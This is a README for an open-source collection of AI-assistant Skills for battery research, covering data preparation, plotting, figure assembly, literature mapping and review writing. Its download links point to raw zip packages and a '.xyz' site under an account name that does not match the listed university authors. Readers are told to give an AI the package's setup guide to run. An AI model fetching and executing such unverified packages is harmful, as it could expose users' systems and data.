# VoltPeer

[简体中文](README.md) · English

Open source Skills for battery research: prepare data, make scientific plots, assemble figures, check evidence and develop review articles.

A Skill is a set of research instructions and tools for an AI assistant. Use it inside an AI application that can read the files and run the tools.

[Get started](#get-started) · [See examples](#see-the-results) · [Download the plotting package (Beta)](https://github.com/arrizabalagags-png/Voltpeer-skills/raw/dfd46fcb4a3255b60826de8a4c721963adc4ff02/docs/downloads/starter/VoltPeer-Plot-Starter-v0.10.1.zip) · [Project website](https://dazi.gsarrizabalaga.xyz/)

## See the results

**Original synthetic demos, not experimental data.** Every figure comes with its data, plotting code and declared model. These examples are not evidence of material performance. [Data and source code](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/main/assets/github-showcase/README.md)

### [Structure and spectra](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/main/assets/github-showcase/README.md#structure-and-spectra)

<a href="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/structure-spectra.png"><img src="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/structure-spectra.png" alt="Synthetic structure and spectra: Bragg-law peak evolution, selected progress traces, generic Raman bands and known spectral components" width="1000"></a>

### [EIS: three views of the same data](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/main/assets/github-showcase/README.md#impedance-spectroscopy)

<a href="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/eis-cpe-warburg.png"><img src="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/eis-cpe-warburg.png" alt="Synthetic CPE and Warburg circuit: equal-scale Nyquist, impedance magnitude and signed phase from the same complex data" width="1000"></a>

### [Six-panel layout demo](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/main/assets/github-showcase/README.md#six-panel-layout)

<a href="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/six-panel-layout.png"><img src="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/six-panel-layout.png" alt="Six-panel layout using independent synthetic efficiency, half-cell capacity, EIS, diffraction and count spectrum models; not one experimental study" width="1000"></a>

<details>
<summary>Another EIS example: an ideal RC circuit</summary>

<img src="https://raw.githubusercontent.com/arrizabalagags-png/Voltpeer-skills/main/assets/github-showcase/eis-ideal-rc.png" alt="Original ideal RC synthetic example: equal-scale semicircle Nyquist, impedance magnitude and signed phase" width="1000">

</details>

## What would you like to do

| Task | Start here |
| --- | --- |
| [Prepare experimental data](skills/battery-data-prepare/SKILL.md) | Check CSV / instrument exports, columns, units and preparation records |
| [Make scientific plots](skills/battery-review-figure/SKILL.md) | Plot author-supplied capacity, coulombic efficiency, EIS and other supported data |
| [Assemble a figure](skills/battery-figure-assemble/SKILL.md) | Align supplied panels, labels, type sizes and spacing |
| [Organize literature](skills/battery-literature-map/SKILL.md) | Build screening records, source tables and evidence links |
| [Develop a review article](skills/battery-review-plan/SKILL.md) | Work from scope and inspected evidence to structure, drafting and revision |
| [Check before submission](skills/battery-review-audit/SKILL.md) | Audit metric comparability, citations and manuscript consistency |

## Get started

**For a first attempt, use DeepSeek Harness desktop.**

1. Install the application from [DeepSeek](https://www.deepseek.com/harness/). Follow the [getting started guide](docs/GETTING_STARTED.md#english) to configure a model and open your research project folder.
2. Download and fully extract the plotting package above. Give the AI its `AGENT_GUIDE.md` and ask it to prepare the environment, install the plotting Skill, then locate the actual Skill file in a new session.
3. Run the synthetic demo and open the result's `index.html`. Next, provide your own data and confirm columns, units and test conditions before plotting.

Plotting needs Python ≥3.10 and network access to obtain dependencies; the package guide prepares an isolated environment. The package is free and open source. AI use follows your application's or model provider's charges. [Installation, costs and troubleshooting](docs/GETTING_STARTED.md#english).

<details>
<summary>Download directly / other applications</summary>

- [Plotting package: fixed program, one plotting Skill and demos](https://github.com/arrizabalagags-png/Voltpeer-skills/raw/dfd46fcb4a3255b60826de8a4c721963adc4ff02/docs/downloads/starter/VoltPeer-Plot-Starter-v0.10.1.zip)
- [Development bundle with all 15 Skills](https://github.com/arrizabalagags-png/Voltpeer-skills/raw/dfd46fcb4a3255b60826de8a4c721963adc4ff02/docs/downloads/BatteryReviewForge-v0.10.1.zip) · [Published full package](https://github.com/arrizabalagags-png/Voltpeer-skills/releases/download/v0.9.2/BatteryReviewForge-v0.9.2.zip)
- Codex, Kimi Code, WorkBuddy and individual Skill routes are in [compatibility](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/codex/public-skills/docs/COMPATIBILITY.md). Check actual discovery in your selected application.
- Model behavior, host discovery and tool availability are assessed separately; see the scope below.

</details>

## Choose by task

| What you have | Skill route |
| --- | --- |
| Raw tables | [`battery-data-prepare`](skills/battery-data-prepare/SKILL.md) → [`battery-review-figure`](skills/battery-review-figure/SKILL.md) |
| Completed panels | [`battery-figure-assemble`](skills/battery-figure-assemble/SKILL.md) |
| A Review topic and sources | [`battery-review-plan`](skills/battery-review-plan/SKILL.md) → [`battery-literature-map`](skills/battery-literature-map/SKILL.md) → [`battery-review-write`](skills/battery-review-write/SKILL.md) |
| A manuscript to check | [`battery-review-audit`](skills/battery-review-audit/SKILL.md) |
| A project with several stages | [`battery-review-forge`](skills/battery-review-forge/SKILL.md) |

<details>
<summary>All 15 Skills</summary>

| Skill | Task |
| --- | --- |
| [`battery-data-prepare`](skills/battery-data-prepare/SKILL.md) | Prepare data |
| [`battery-review-figure`](skills/battery-review-figure/SKILL.md) | Plots, captions and scientific checks |
| [`battery-figure-assemble`](skills/battery-figure-assemble/SKILL.md) | Assemble supplied panels |
| [`battery-experiment-plan`](skills/battery-experiment-plan/SKILL.md) | Plan experiments and controls |
| [`battery-literature-map`](skills/battery-literature-map/SKILL.md) | Search, screen and map literature |
| [`battery-claim-check`](skills/battery-claim-check/SKILL.md) | Check claims against sources |
| [`battery-metrics-audit`](skills/battery-metrics-audit/SKILL.md) | Audit metric comparability |
| [`battery-review-plan`](skills/battery-review-plan/SKILL.md) | Plan a Review |
| [`battery-review-write`](skills/battery-review-write/SKILL.md) | Write from inspected evidence |
| [`battery-review-polish`](skills/battery-review-polish/SKILL.md) | Polish, translate and shorten |
| [`battery-review-audit`](skills/battery-review-audit/SKILL.md) | Audit a manuscript before submission |
| [`battery-review-submission`](skills/battery-review-submission/SKILL.md) | Prepare submission materials |
| [`battery-review-response`](skills/battery-review-response/SKILL.md) | Prepare revision responses |
| [`battery-reviewer`](skills/battery-reviewer/SKILL.md) | Provide an independent referee-style review |
| [`battery-review-forge`](skills/battery-review-forge/SKILL.md) | Coordinate a multi-stage project |

</details>

## Try a short request

> Here is my cycling CSV. Check columns, units and test conditions, then plot capacity against cycle number. Preserve the original values.

> Assemble these six panels as Fig. 3 at the submission size. Align labels, type sizes and spacing, and keep the originals.

> Here are my Review outline and sources. Organize inspected evidence and gaps before discussing the structure.

> Can the performance numbers in this table be compared? List missing conditions first.

> Check whether the source papers support this paragraph's numbers and claims. Mark anything not inspected.

## Data and research responsibility

- Quantitative plots use the supplied program. Missing units, conditions or provenance require clarification before proceeding.
- VoltPeer does not ask you to upload research files to the website or send the authors an API key. Your chosen AI application determines what is sent to its model provider.
- Check that application's privacy policy before using unpublished material. De-identify public feedback and confirm permission to share.
- Authors remain responsible for data, citations, rights and scientific conclusions. Not reported and not verified are distinct states; neither is zero or verified evidence.

## Documentation and scope

This branch retains the **0.9.2 published Skill package**. Download links point to published **0.10.1 Beta**. The new gallery includes its own data and source code. Work on 0.10.2 is local; its packages have not been published. Native desktop discovery and complete behavior validation remain pending. Delivery formatting in the limited Flash API trial is PARTIAL. [Version notes](docs/RELEASE_v0.9.2.md) · [Compatibility and exact validation scope](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/codex/public-skills/docs/COMPATIBILITY.md).

| Learn more | Document |
| --- | --- |
| Installation and a first plot | [Getting started](docs/GETTING_STARTED.md#english) |
| Author data, palettes and plotting | [Uploaded-data plotting](skills/battery-review-figure/references/UPLOADED_DATA.md) |
| Submission sizes and panel layout | [Figure composition](skills/battery-figure-assemble/references/COMPOSITION.md) |
| Literature / Reviews / experiments | [Literature mapping](skills/battery-literature-map/SKILL.md) · [Review planning](skills/battery-review-plan/SKILL.md) · [Experiment planning](skills/battery-experiment-plan/SKILL.md) |
| Engineering and behavior tests | [Validation protocol and records](https://github.com/arrizabalagags-png/Voltpeer-skills/blob/codex/public-skills/docs/EVAL.md) |
| Maintenance and full technical detail | [Maintainer guide](docs/MAINTAINER_GUIDE.md) · [Original technical README for this branch](docs/TECHNICAL_REFERENCE_v0.9.2.md) |

Shuo Guo and Jinlong Jiang, Institute of Energy Materials Science, University of Shanghai for Science and Technology. [Authors](AUTHORS.md) · [Cite](CITATION.cff) · [MIT](LICENSE) · [Contribute](CONTRIBUTING.md) · [Support](SUPPORT.md) · [Security](SECURITY.md). Legacy package names and technical IDs remain compatible.
